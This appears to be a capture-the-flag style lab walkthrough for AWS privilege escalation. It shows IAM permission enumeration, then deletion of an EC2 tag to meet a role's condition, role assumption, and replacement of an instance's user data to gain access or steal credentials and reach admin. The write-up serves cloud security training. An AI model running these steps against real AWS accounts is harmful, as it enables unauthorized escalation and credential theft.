### Enumerate the user and roles we have access to from the start cg_dev_user
```
# Gather all roles and users permissions
iamactionhunter --collect --profile cg_dev_user

# Check for Write actions that the dev_user has
iamactionhunter --config write_actions --account <account_id> --user cg_dev_user

# Check if the dev_user has any interesting IAM permissions
iamactionhunter --config dangerous_iam --account <account_id> --user cg_dev_user

# See what write permissions the role you can assume has
iamactionhunter --config write_actions --account <account_id> --role cg_ec2_management_role

# Check back on the dev_user see if you can do anything with tags
iamactionhunter --query 'ec2:*tag*' --account <account_id> --user cg_dev_user

# Note you can delete tags allowing you to satisfy the condition set for the ec2_management_role
```

### Use the dev_user to enumerate ec2 instances
```
# Get instances that have the tag referenced in the condition
aws ec2 describe-instances --region us-west-2 --profile cg_dev_user --filter "Name=tag:Name,Values=cg_admin_ec2*" 
```



### Delete the tag using the dev_user on the EC2 to satisfy the condition for the cg_ec2_management_role
```
aws ec2 delete-tags --region us-west-2 --profile cg_dev_user --resources <instance_id> --tags Key=Name
```

### Assume the cg_ec2_management_role
```
aws sts assume-role --role-arn arn:aws:iam::<account_id>:role/cg_ec2_management_role --role-session-name blah --profile cg_dev_user
```

### Use the cg_ec2_management_role to stop the instance
```
aws ec2 stop-instances --region us-west-2 --profile cg_ec2_management_role --instance-ids <instance_id>
```

### Use the cg_ec2_management_role to modify the userdata to access the EC2 or exfiltrate credentials from it ([https://hackingthe.cloud/aws/exploitation/local-priv-esc-mod-instance-att/](https://hackingthe.cloud/aws/exploitation/local_ec2_priv_esc_through_user_data/))
```
aws ec2 modify-instance-attribute --region us-west-2 --profile cg_ec2_management_role --instance-id <instance_id> --user-data file://userdata.txt
```

### Use the cg_ec2_management_role to start the instance
```
aws ec2 start-instances --region us-west-2 --profile cg_ec2_management_role --instance-ids <instance_id>
```

### Access the EC2 or exfiltrate credentials and gain admin privileges
